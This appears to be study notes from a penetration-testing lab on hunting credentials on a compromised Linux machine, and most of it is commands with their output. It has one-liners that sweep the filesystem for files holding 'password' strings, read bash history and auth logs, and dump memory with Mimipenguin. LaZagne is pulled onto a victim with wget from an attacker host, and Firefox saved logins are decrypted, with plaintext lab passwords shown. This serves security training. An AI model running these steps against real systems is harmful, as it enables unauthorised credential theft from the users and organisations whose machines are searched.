# Files
- configs, databases, notes, scripts, source code, cronjobs, ssh keys
## Searching for Config Files
```Markdown
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```
- searches for file extensions
  
```Markdown
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```
- searches for file contents
    
    - user, password, pass
    
  
## Searching for Databases
```Markdown
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```
  
## Searching for Notes
```Markdown
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```
  
  
## Searching for Scripts
```Markdown
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```
  
## Enumerating Cronjobs
```Markdown
Nathan2112@htb[/htb]$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
Nathan2112@htb[/htb]$ ls -la /etc/cron.*/
/etc/cron.d/:
total 28
drwxr-xr-x 1 root root  106  3. Jan 20:27 .
drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
-rw-r--r-- 1 root root  201  1. Mär 2021  e2scrub_all
-rw-r--r-- 1 root root  331  9. Jan 2021  geoipupdate
-rw-r--r-- 1 root root  607 25. Jan 2021  john
-rw-r--r-- 1 root root  589 14. Sep 2020  mdadm
-rw-r--r-- 1 root root  712 11. Mai 2020  php
-rw-r--r-- 1 root root  102 22. Feb 2021  .placeholder
-rw-r--r-- 1 root root  396  2. Feb 2021  sysstat
/etc/cron.daily/:
total 68
drwxr-xr-x 1 root root  252  6. Jan 16:24 .
drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
<SNIP>
```
  
# History
- logs, command-line history
## Enumerating History Files
```Markdown
tail -n5 /home/*/.bash*
```
  
## Enumerating Log Files
|**File**|**Description**|
|---|---|
|`/var/log/messages`|Generic system activity logs.|
|`/var/log/syslog`|Generic system activity logs.|
|`/var/log/auth.log`|(Debian) All authentication related logs.|
|`/var/log/secure`|(RedHat/CentOS) All authentication related logs.|
|`/var/log/boot.log`|Booting information.|
|`/var/log/dmesg`|Hardware and drivers related information and logs.|
|`/var/log/kern.log`|Kernel related warnings, errors and logs.|
|`/var/log/faillog`|Failed login attempts.|
|`/var/log/cron`|Information related to cron jobs.|
|`/var/log/mail.log`|All mail server related logs.|
|`/var/log/httpd`|All Apache related logs.|
|`/var/log/mysqld.log`|All MySQL server related logs.|
```Markdown
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```
  
# Memory
- cache, in-memory processing
## Mimipenguin
- similar to mimikatz
- need to be root
```Markdown
Nathan2112@htb[/htb]$ sudo python3 mimipenguin.py
[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY
```
  
## LaZagne
in order to get LaZagne to work on Linux, you have to zip up the repo and send the entire thing over
```Markdown
# On attacker
tar czf lazagne.tgz LaZagne
# On victim
wget <IP>:<port>/lazagne.tgz
tar xzf lazagne.tgz
cd LaZagne
python3 LaZagne.py
```
```Markdown
Nathan2112@htb[/htb]$ sudo python2.7 laZagne.py all
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|
------------------- Shadow passwords -----------------
[+] Hash found !!!
Login: systemd-coredump
Hash: !!:18858::::::
[+] Hash found !!!
Login: sambauser
Hash: $6$wgK4tGq7Jepa.V0g$QkxvseL.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs7x/fhI.8negiUSPqaWyv7wC8uwsWPrx1:18862:0:99999:7:::
[+] Password found !!!
Login: cry0l1t3
Password: WLpAEXFa0SbqOHY

[+] 3 passwords have been found.
For more information launch it again with the -v option
elapsed time = 3.50091600418
```
  
  
# Key-Rings
- browser stored credentials
## Browser Credentials
- firefox stores credentials encrypted in a hidden folder for the respective user
```Markdown
[!bash]$ ls -l .mozilla/firefox/ | grep default 
drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release
drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default
```
- once you know where the folder is, you can open logins.json to get the encrypted password
```Markdown
Nathan2112@htb[/htb]$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
{
  "nextId": 2,
  "logins": [
    {
      "id": 1,
      "hostname": "https://www.inlanefreight.com",
      "httpRealm": null,
      "formSubmitURL": "https://www.inlanefreight.com",
      "usernameField": "username",
      "passwordField": "password",
      "encryptedUsername": "MDoEEPgAAAA...SNIP...1liQiqBBAG/8/UpqwNlEPScm0uecyr",
      "encryptedPassword": "MEIEEPgAAAA...SNIP...FrESc4A3OOBBiyS2HR98xsmlrMCRcX2T9Pm14PMp3bpmE=",
      "guid": "{412629aa-4113-4ff9-befe-dd9b4ca388e2}",
      "encType": 1,
      "timeCreated": 1643373110869,
      "timeLastUsed": 1643373110869,
      "timePasswordChanged": 1643373110869,
      "timesUsed": 1
    }
  ],
  "potentiallyVulnerablePasswords": [],
  "dismissedBreachAlertsByLoginGUID": {},
  "version": 3
}
```
- can use the tool Firefox Decrypt to get the password
[https://github.com/unode/firefox_decrypt](https://github.com/unode/firefox_decrypt)
```Markdown
Nathan2112@htb[/htb]$ python3.9 firefox_decrypt.py
Select the Mozilla profile you wish to decrypt
1 -> lfx3lvhb.default
2 -> 1bplpd86.default-release
2
Website:   https://testing.dev.inlanefreight.com
Username: 'test'
Password: 'test'
Website:   https://www.inlanefreight.com
Username: 'cry0l1t3'
Password: 'FzXUxJemKm6g2lGh'
```
  
- alternatively, LaZagne can also return results (can get cracked password)
```Markdown
Nathan2112@htb[/htb]$ python3 laZagne.py browsers
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|
------------------- Firefox passwords -----------------
[+] Password found !!!
URL: https://testing.dev.inlanefreight.com
Login: test
Password: test
[+] Password found !!!
URL: https://www.inlanefreight.com
Login: cry0l1t3
Password: FzXUxJemKm6g2lGh

[+] 2 passwords have been found.
For more information launch it again with the -v option
elapsed time = 0.2310788631439209
```